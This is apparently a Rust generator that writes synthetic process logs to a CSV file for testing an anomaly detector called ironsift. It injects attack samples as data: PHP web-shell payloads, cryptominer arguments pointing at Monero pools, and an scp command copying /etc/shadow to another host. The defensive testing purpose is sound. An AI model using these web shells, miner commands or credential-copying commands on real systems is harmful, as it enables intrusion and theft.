use std::error::Error;
use std::fs::File;
use rand::Rng;
use chrono::{Utc, Duration};

use ironsift::RawLogEntry;

const OUTPUT_FILE: &str = "large_dataset.csv";
const NUM_MACHINES: u32 = 100;
const LOGS_PER_MACHINE: u32 = 1_000;

fn main() -> Result<(), Box<dyn Error>> {
    println!("{:=^60}", " IRONSIFT DATA GENERATOR ");
    println!();
    println!("Generating {} logs for {} machines...", 
        NUM_MACHINES * LOGS_PER_MACHINE, NUM_MACHINES);
    println!("Output: {}", OUTPUT_FILE);
    println!();
    
    let file = File::create(OUTPUT_FILE)?;
    let mut wtr = csv::Writer::from_writer(file);
    let mut rng = rand::thread_rng();
    
    // Start time: 7 days ago
    let mut current_time = Utc::now() - Duration::days(7);

    // 1. Define Realistic Normal Processes
    let normal_processes = vec![
        ("nginx", "systemd", 33, "/usr/sbin/nginx", "-c /etc/nginx/nginx.conf"),
        ("sshd", "systemd", 0, "/usr/sbin/sshd", "-D"),
        ("postgres", "systemd", 70, "/usr/lib/postgresql/14/bin/postgres", "-D /var/lib/postgresql/data"),
        ("node", "bash", 1000, "/usr/bin/node", "server.js"),
        ("python3", "systemd", 1000, "/usr/bin/python3", "app.py"),
        ("cron", "systemd", 0, "/usr/sbin/cron", "-f"),
        ("dockerd", "systemd", 0, "/usr/bin/dockerd", "-H fd://"),
        ("redis-server", "systemd", 999, "/usr/bin/redis-server", "/etc/redis/redis.conf"),
        ("apache2", "systemd", 33, "/usr/sbin/apache2", "-k start"),
        ("mysqld", "systemd", 999, "/usr/sbin/mysqld", "--defaults-file=/etc/mysql/my.cnf"),
    ];

    // 2. Attack Scenarios with Realistic Indicators
    
    // Cryptominer (High CPU, suspicious path, root)
    let miner_processes = [
        ("kworker", "/tmp/.X11-unix/kworker", "--url stratum+tcp://pool.minexmr.com:4444"),
        ("systemd", "/var/tmp/.cache/systemd", "--donate-level 1 -o pool.supportxmr.com:3333"),
        ("[kthreadd]", "/dev/shm/.config/worker", "-o xmr-eu1.nanopool.org:14444"),
    ];
    
    // Web Shell (High entropy, php-fpm context)
    let web_shell_payloads = [
        "eval(base64_decode('aGVsbG8gd29ybGQ='));",
        "system($_GET['cmd']);",
        "<?php @eval($_POST['x']);?>",
    ];
    
    // Privilege Escalation (Unusual UID 0 processes)
    let privesc_processes = [
        ("node", "/home/appuser/.npm/node", "exploit.js"),
        ("python3", "/tmp/setup.py", "install"),
        ("bash", "/home/ubuntu/.bashrc.d/init", ""),
    ];
    
    // Lateral Movement (Unusual SSH activity)
    let lateral_movement = [
        ("ssh", "/usr/bin/ssh", "-o StrictHostKeyChecking=no root@10.0.1.5"),
        ("scp", "/usr/bin/scp", "-r /etc/shadow user@192.168.1.100:/tmp"),
    ];

    println!("Scenario Overview:");
    println!("  🔹 90 clean machines (normal operations)");
    println!("  🔸 3 cryptominers (machine_013, machine_027, machine_065)");
    println!("  🔸 2 web shells (machine_042, machine_088)");
    println!("  🔸 3 privilege escalation (machine_019, machine_051, machine_077)");
    println!("  🔸 2 lateral movement (machine_034, machine_091)");
    println!();

    for i in 0..NUM_MACHINES {
        let machine_id = format!("machine_{:03}", i);
        
        if i % 10 == 0 {
            println!("📊 Processing batch: {}...", machine_id);
        }

        for log_idx in 0..LOGS_PER_MACHINE {
            // Advance time by ~1-5 minutes per log
            current_time = current_time + Duration::seconds(rng.gen_range(60..300));
            let timestamp = current_time.to_rfc3339();
            
            // Pick a random normal process
            let template = normal_processes[rng.gen_range(0..normal_processes.len())];
            let (mut name, mut parent, mut uid, mut path, args_ref) = template;
            let mut args = args_ref.to_string();

            // --- INJECT ATTACK SCENARIOS ---
            
            // SCENARIO 1: Cryptominers (Machines 13, 27, 65)
            if (i == 13 || i == 27 || i == 65) && rng.gen_bool(0.08) {
                let miner = miner_processes[rng.gen_range(0..miner_processes.len())];
                name = miner.0;
                parent = "systemd";
                uid = 0; // Running as root - major red flag
                path = miner.1;
                args = miner.2.to_string();
            }

            // SCENARIO 2: Web Shells (Machines 42, 88)
            if (i == 42 || i == 88) && name == "apache2" && rng.gen_bool(0.03) {
                name = "php-fpm";
                parent = "apache2";
                args = web_shell_payloads[rng.gen_range(0..web_shell_payloads.len())].to_string();
            }

            // SCENARIO 3: Privilege Escalation (Machines 19, 51, 77)
            if (i == 19 || i == 51 || i == 77) && rng.gen_bool(0.05) {
                let privesc = privesc_processes[rng.gen_range(0..privesc_processes.len())];
                name = privesc.0;
                parent = "bash";
                uid = 0; // Escalated to root
                path = privesc.1;
                args = privesc.2.to_string();
            }

            // SCENARIO 4: Lateral Movement (Machines 34, 91)
            if (i == 34 || i == 91) && rng.gen_bool(0.04) {
                let lateral = lateral_movement[rng.gen_range(0..lateral_movement.len())];
                name = lateral.0;
                parent = "bash";
                uid = 0;
                path = lateral.1;
                args = lateral.2.to_string();
            }

            // Add some random variation to make it realistic
            if rng.gen_bool(0.05) {
                args = format!("{} --debug", args);
            }

            wtr.serialize(RawLogEntry {
                machine_id: machine_id.clone(),
                name: name.to_string(),
                parent: parent.to_string(),
                uid,
                path: path.to_string(),
                args: args,
                timestamp: Some(timestamp),
            })?;
        }
    }

    wtr.flush()?;
    println!();
    println!("✅ Done! Dataset written to '{}'", OUTPUT_FILE);
    println!();
    println!("Next Steps:");
    println!("  1. Run analysis: cargo run --bin ironsift");
    println!("  2. Export report: cargo run --bin ironsift -- --export-json");
    println!("  3. Adjust sensitivity: cargo run --bin ironsift -- --tolerance 0.08");
    
    Ok(())
}